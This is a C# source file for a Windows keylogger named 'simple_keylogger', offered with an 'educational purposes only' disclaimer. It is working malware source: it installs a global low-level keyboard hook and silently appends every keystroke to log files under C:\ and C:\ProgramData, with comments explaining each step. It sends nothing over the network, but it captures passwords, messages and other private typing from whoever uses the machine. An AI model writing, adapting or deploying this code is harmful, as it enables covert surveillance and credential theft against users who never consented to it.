/*
=========================================================================
  Program: simple_keylogger
  Copyright (c) d3coy
    
  This software distributes without any warranty and for educational purposes only.
  The responsibility for an illegal use rests with an end user! 
=========================================================================
 */
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Windows.Forms;
using System.IO;

namespace keylog_windowz
{
    class Program
    {
        /* Variable is used for defining the hook procedure we will be using, an integer value of 13 indicates that we will
         install the hook procedure that monitors low-level input events */
        private static int WH_KEYBOARD_LL = 13;
        /* this variable comparing with wParam variable in the HookCallback function, if wParam == WM_KEYDOWN it means
         user pressed non-system key */
        private static int WM_KEYDOWN = 0x0100;
        /* this variable will hold the memory address of our hook procedure. In our case the hook procedure monitors low-level
         keyboard input events and is later defined in our code by the WH_KEYBOARD_LL variable within the SetWindowsHookEx func. */
        private static IntPtr hook = IntPtr.Zero;
        /* this will be a delegate of the HookCallback function. The HCb function defines what we want our program to do every
         time a new keyboard input event takes place. */
        private static LowLevelKeyboardProc llkProcedure = HookCallback;
        static void Main(string[] args)
        {
            hook = SetHook(llkProcedure); //defining a hook with the SetHook function
            Application.Run(); //begging listen for system events, and prevents ffrom closing.
            UnhookWindowsHookEx(hook);  //is used to remove the hook we created, if we want to stop keylogging, we might use this
        }
        /* here is delegate, that returns value type -> IntPtr, name is -> LowLevelKeyboardProc, and it waits for parameters ->
         (Code, IntPtr wParam, IntPtr lParam) */
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                if (((Keys)vkCode).ToString() == "OemPeriod")
                {
                    Console.Out.Write(".");
                    StreamWriter output = new StreamWriter(@"C:\ProgramData\mylog.txt", true);
                    output.Write(".");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "Oemcomma")
                {
                    Console.Out.Write(",");
                    StreamWriter output = new StreamWriter(@"C:\mylog.txt", true);
                    output.Write(",");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "Space")
                {
                    Console.Out.Write(" ");
                    StreamWriter output = new StreamWriter(@"C:\mylog.txt", true);
                    output.Write(" ");
                    output.Close();
                }
                else
                {
                    Console.Out.Write((Keys)vkCode);
                    StreamWriter output = new StreamWriter(@"C:\mylog.txt", true);
                    output.Write((Keys)vkCode);
                    output.Close();
                }

            }
            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            Process currentProcess = Process.GetCurrentProcess();
            ProcessModule currentModule = currentProcess.MainModule;
            String moduleName = currentModule.ModuleName;
            IntPtr moduleHandle = GetModuleHandle(moduleName);
            return SetWindowsHookEx(WH_KEYBOARD_LL, llkProcedure, moduleHandle, 0);
        }

        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll")]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(String lpModuleName);
    }
}
